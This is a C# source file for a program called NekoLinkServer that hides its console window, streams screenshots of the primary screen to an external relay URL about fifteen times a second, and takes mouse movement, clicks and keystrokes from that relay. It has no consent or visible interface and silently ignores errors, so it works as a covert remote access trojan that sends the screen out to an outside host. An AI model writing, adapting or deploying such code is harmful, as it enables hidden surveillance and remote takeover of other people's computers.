using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Windows.Forms;

class NekoLinkServer
{
    static string relayUrl = "https://fantastic-umbrella-jjpgj56jrvgvc7g9-8080.app.github.dev";
    static HttpClient client = new HttpClient();
    
    [STAThread]
    static void Main()
    {
        // Hide console
        var handle = GetConsoleWindow();
        ShowWindow(handle, 0);
        
        // Start command listener
        Thread cmdThread = new Thread(CheckCommands);
        cmdThread.Start();
        
        // Send frames
        while (true)
        {
            try
            {
                using (Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bmp))
                        g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                    
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmp.Save(ms, ImageFormat.Jpeg);
                        byte[] data = ms.ToArray();
                        
                        var content = new ByteArrayContent(data);
                        client.PostAsync($"{relayUrl}/frame", content).Wait();
                    }
                }
                Thread.Sleep(66); // ~15fps
            }
            catch { }
        }
    }
    
    static void CheckCommands()
    {
        while (true)
        {
            try
            {
                var response = client.GetAsync($"{relayUrl}/command").Result;
                if (response.StatusCode == HttpStatusCode.OK)
                {
                    string cmd = response.Content.ReadAsStringAsync().Result;
                    string[] parts = cmd.Split(',');
                    
                    if (parts[0] == "MOUSE" && parts.Length >= 3)
                    {
                        if (int.TryParse(parts[1], out int x) && int.TryParse(parts[2], out int y))
                            Cursor.Position = new Point(x, y);
                    }
                    else if (parts[0] == "CLICK" && parts.Length >= 4)
                    {
                        if (int.TryParse(parts[1], out int x) && int.TryParse(parts[2], out int y))
                        {
                            Cursor.Position = new Point(x, y);
                            mouse_event(0x02, 0, 0, 0, UIntPtr.Zero);
                            Thread.Sleep(50);
                            mouse_event(0x04, 0, 0, 0, UIntPtr.Zero);
                        }
                    }
                    else if (parts[0] == "KEY" && parts.Length >= 3)
                    {
                        if (byte.TryParse(parts[1], out byte key))
                        {
                            uint flags = parts[2] == "True" ? 0u : 2u;
                            keybd_event(key, 0, flags, UIntPtr.Zero);
                        }
                    }
                }
            }
            catch { }
            Thread.Sleep(100);
        }
    }
    
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo);
    
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    
    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
    
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
